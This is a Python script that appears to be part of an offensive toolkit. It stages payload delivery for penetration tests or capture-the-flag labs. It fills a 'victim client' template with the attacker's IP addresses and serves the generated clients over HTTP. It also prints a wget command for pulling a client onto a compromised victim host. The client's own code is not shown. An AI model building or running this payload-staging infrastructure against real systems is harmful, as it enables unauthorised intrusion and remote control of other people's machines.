import http.server
import os
import shutil
import socketserver
from typing import List
import utilities

PORT = 8000
SERVING_DIRECTORY = '/tmp/phcat/'
VICTIM_CLIENT_FILENAME = 'victim_client_template.py'
TRANSFER_FOLDER = 'transfer/'

def main():
    prepare_serving_directory(SERVING_DIRECTORY, TRANSFER_FOLDER)
    os.chdir(SERVING_DIRECTORY)
    ipv4s = utilities.fetch_ipv4_addresses()
    create_victim_clients_for_addresses(VICTIM_CLIENT_FILENAME, ipv4s)

    http_handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(('', PORT), http_handler) as httpd:
        print('HTTP server information:')
        print(f'  Serving on {PORT}')
        print(f'  Serving directory {SERVING_DIRECTORY}')

        print('IPv4 addresses:')
        for ipv4 in ipv4s:
            print(f'  {ipv4}')

        print('Available files:')
        for available_file in os.listdir():
            print(f'  {available_file}')

        print('Example transfer commands (on victim):')
        print(f'  $ wget 10.10.14.8:{PORT}/victim_client_10.10.14.8.py')

        print('Waiting for requests...')
        httpd.serve_forever()

def create_victim_clients_for_addresses(template_filename: str, ipv4s: List[str]):
    with open(template_filename, 'r') as template_file:
        data = template_file.read()

    for ipv4 in ipv4s:
        address_specific_data = data.replace('<ATTACKER_IP>', ipv4)
        address_specific_filename = template_filename.replace('template.py', f'{ipv4}.py')
        with open(address_specific_filename, 'w') as address_specific_file:
            address_specific_file.write(address_specific_data)

def prepare_serving_directory(directory: str, transfer_folder: str):
    os.makedirs(directory, exist_ok=True)
    shutil.copy2(VICTIM_CLIENT_FILENAME, directory)
    for filename in os.listdir(transfer_folder):
        shutil.copy2(transfer_folder + filename, directory)

if __name__ == '__main__':
    main()
